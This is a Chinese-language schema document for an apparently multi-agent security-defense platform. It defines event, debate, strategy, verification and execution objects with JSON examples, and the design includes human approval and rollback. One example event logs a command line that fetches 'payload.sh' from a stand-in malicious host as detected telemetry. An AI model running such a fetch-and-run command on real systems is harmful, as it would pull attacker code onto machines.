# 核心领域模型定义

本文档定义跨模块共享的核心对象，约束 JSON 字段名统一使用 `camelCase`，Java 与 Python 保持一致。

---

## 1) SecurityEvent

### 字段定义

- `eventId: string` 事件唯一标识
- `timestamp: string(date-time)` 事件发生时间（ISO-8601 UTC）
- `sourceType: enum(SourceType)` 事件来源系统类型
- `subject: string` 主体（发起方，如 user/pod/service-account）
- `action: string` 行为（如 login/exec/connect）
- `object: string` 客体（被作用对象，如 host/api/namespace）
- `context: object` 扩展上下文（IP、UA、cluster、geo 等）
- `severity: enum(Severity)` 语义严重等级
- `riskScore: number[0..1]` 风险分
- `labels: string[]` 标签（MITRE 技术、业务域等）

### JSON 示例

```json
{
  "eventId": "evt-20260414-0001",
  "timestamp": "2026-04-14T15:10:12Z",
  "sourceType": "EDR",
  "subject": "workstation-17",
  "action": "process_exec",
  "object": "/usr/bin/curl",
  "context": {
    "srcIp": "10.1.2.3",
    "commandLine": "curl http://malicious.example/payload.sh",
    "cluster": "prod-cn-1"
  },
  "severity": "HIGH",
  "riskScore": 0.86,
  "labels": ["T1059", "egress-anomaly"]
}
```

### 字段含义与后续使用

- `defense-gateway` 负责填充并标准化 `SecurityEvent`
- `agent-brain` 以该对象作为辩论输入上下文
- `dashboard-ui` 以 `severity/riskScore/labels` 聚合展示风险态势

---

## 2) DebateState

### 字段定义

- `debateId: string` 单次多智能体辩论 ID
- `securityEvent: SecurityEvent` 输入事件快照
- `retrievedContext: string[]` 检索增强上下文（规则、历史案例、威胁情报摘要）
- `plannerProposal: DefenseStrategy|null` Planner 初始策略
- `redTeamChallenges: string[]` Red-Teamer 的挑战点
- `revisedProposal: DefenseStrategy|null` 修订后策略
- `round: integer` 当前回合数
- `status: enum(DebateStatus)` 辩论状态
- `finalDecision: FinalDecision|null` 最终决策
- `history: DebateTurn[]` 关键推理轨迹

### JSON 示例

```json
{
  "debateId": "deb-001",
  "securityEvent": {
    "eventId": "evt-20260414-0001",
    "timestamp": "2026-04-14T15:10:12Z",
    "sourceType": "EDR",
    "subject": "workstation-17",
    "action": "process_exec",
    "object": "/usr/bin/curl",
    "context": {"srcIp": "10.1.2.3"},
    "severity": "HIGH",
    "riskScore": 0.86,
    "labels": ["T1059"]
  },
  "retrievedContext": ["历史相似事件建议先隔离终端再阻断域名"],
  "plannerProposal": null,
  "redTeamChallenges": [],
  "revisedProposal": null,
  "round": 1,
  "status": "IN_PROGRESS",
  "finalDecision": null,
  "history": [
    {
      "round": 1,
      "actor": "Planner",
      "message": "建议先隔离主机并阻断 IOC",
      "timestamp": "2026-04-14T15:10:20Z"
    }
  ]
}
```

### 字段含义与后续使用

- `agent-brain` 在每回合更新 `round/status/history`
- `formal-verifier` 使用 `revisedProposal` 做约束校验
- `dashboard-ui` 展示推理可解释轨迹与审计证据

---

## 3) DefenseStrategy

### 字段定义

- `strategyId: string` 策略 ID
- `threatType: enum(ThreatType)` 威胁分类
- `targetLayer: enum(TargetLayer)` 目标防护层
- `actions: DefenseAction[]` 执行动作列表（类型、目标、参数）
- `scope: StrategyScope` 生效范围
- `ttl: integer` 生效时长（秒）
- `rollbackPlan: RollbackPlan` 回滚计划
- `confidence: number[0..1]` 模型置信度
- `generatedBy: enum(GeneratedBy)` 产出来源
- `approved: boolean` 是否已通过审批

### JSON 示例

```json
{
  "strategyId": "stg-20260414-001",
  "threatType": "MALWARE",
  "targetLayer": "ENDPOINT",
  "actions": [
    {
      "type": "ISOLATE_HOST",
      "target": "workstation-17",
      "parameters": {"durationMinutes": 60}
    },
    {
      "type": "BLOCK_DOMAIN",
      "target": "malicious.example",
      "parameters": {"source": "threat-intel"}
    }
  ],
  "scope": {
    "assets": ["workstation-17"],
    "namespaces": [],
    "tenantId": "tenant-a"
  },
  "ttl": 3600,
  "rollbackPlan": {
    "planId": "rb-20260414-001",
    "steps": ["解除主机隔离", "删除临时阻断规则"],
    "triggerCondition": "false_positive_confirmed"
  },
  "confidence": 0.82,
  "generatedBy": "COORDINATOR",
  "approved": false
}
```

### 字段含义与后续使用

- `formal-verifier` 校验 `actions/scope/ttl` 是否违反约束
- `actuator-service` 依据 `actions` 映射到 K8s/WAF/Firewall 执行器
- `dashboard-ui` 以 `approved/confidence` 提供人工确认入口

---

## 4) VerificationResult

### 字段定义

- `passed: boolean` 是否通过验证
- `violatedConstraints: string[]` 违反的约束清单
- `warnings: string[]` 风险警告
- `reason: string` 本次判定主因
- `suggestedFixes: string[]` 建议修复动作

### JSON 示例

```json
{
  "passed": false,
  "violatedConstraints": ["ttl_exceeds_policy_limit", "cross_tenant_scope_not_allowed"],
  "warnings": ["action APPLY_FIREWALL_RULE needs CAB approval"],
  "reason": "策略范围越权且 TTL 超限",
  "suggestedFixes": ["将 ttl 降低到 1800", "scope.tenantId 限制为 tenant-a"]
}
```

### 字段含义与后续使用

- `agent-brain` 根据 `suggestedFixes` 自动触发再规划
- `actuator-service` 仅在 `passed=true && approved=true` 时进入执行
- `dashboard-ui` 用于展示审计可解释信息

---

## 5) ExecutionRecord

### 字段定义

- `executionId: string` 执行实例 ID
- `strategyId: string` 关联策略 ID
- `executorType: enum(ExecutorType)` 执行器类型
- `status: enum(ExecutionStatus)` 执行状态
- `startTime: string(date-time)` 开始时间
- `endTime: string(date-time)|null` 结束时间
- `resultMessage: string` 执行结果摘要
- `rollbackStatus: enum(RollbackStatus)` 回滚状态

### JSON 示例

```json
{
  "executionId": "exe-20260414-001",
  "strategyId": "stg-20260414-001",
  "executorType": "WAF",
  "status": "SUCCEEDED",
  "startTime": "2026-04-14T15:12:00Z",
  "endTime": "2026-04-14T15:12:09Z",
  "resultMessage": "2 条 WAF 规则已下发",
  "rollbackStatus": "AVAILABLE"
}
```

### 字段含义与后续使用

- `actuator-service` 作为执行审计主表
- `dashboard-ui` 展示运行态与回滚态
- 后续可接入告警系统，以 `status/rollbackStatus` 触发通知

---

## 枚举统一约束

Java 与 Python 已同步以下枚举：  
`SourceType` `Severity` `DebateStatus` `DecisionType` `ThreatType` `TargetLayer` `ActionType` `GeneratedBy` `ExecutorType` `ExecutionStatus` `RollbackStatus`

